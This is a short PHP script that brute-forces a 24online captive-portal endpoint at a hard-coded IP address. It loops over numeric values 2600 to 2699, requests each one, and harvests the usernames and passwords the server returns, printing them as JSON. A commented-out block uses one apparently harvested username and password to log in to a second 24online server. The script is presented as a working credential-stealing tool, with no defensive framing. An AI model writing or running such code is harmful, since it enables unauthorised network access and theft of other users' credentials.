<?php



	class user {

		public $username, $password;

		public function __construct($username, $password){
				$this->username = $username;
				$this->password = $password;
		}
	}


	function getID($pass){

			$ion_url = "http://1.186.15.77/24online/servlet/AjaxManager?mode=2000&nasip=1.186.15.75&password=";
			$ion_url .= ''.$pass;

			$curl_handle = curl_init();
			curl_setopt($curl_handle, CURLOPT_URL, $ion_url);
			curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,2);
			curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER,1);
			$buffer = curl_exec($curl_handle);
			curl_close($curl_handle);
			if(empty($buffer)){
				return false;
			}else{
				return $buffer;
			}
	}

	$users = [];

	for($i=2600; $i<2700; $i++){
		$buffer = getID($i);
		if($buffer){
			$xml = simplexml_load_string($buffer);
			if ($xml->returnstatus!='-1' && strlen((int)$xml->username)==9)
			{
				array_push($users, new user((string) $xml->username, (string) $xml->password));
			}
		}
	}

	echo json_encode($users);

	/*print "

	<script src='jquery.min.js'></script>


<script>

$(document).ready(function(){
			var username = 141610124;
			var password = 'VHYJELAN';
			var dataString = '&username='+username+'&password='+password+'&mode=193&isAccessDenied=null';
			$.ajax({
			type: 'POST',
			url: 'http://172.16.16.16/24online/servlet/E24onlineHTTPClient',
			data: dataString,
			dataType: 'json'
			});

});

</script>

";*/


?>
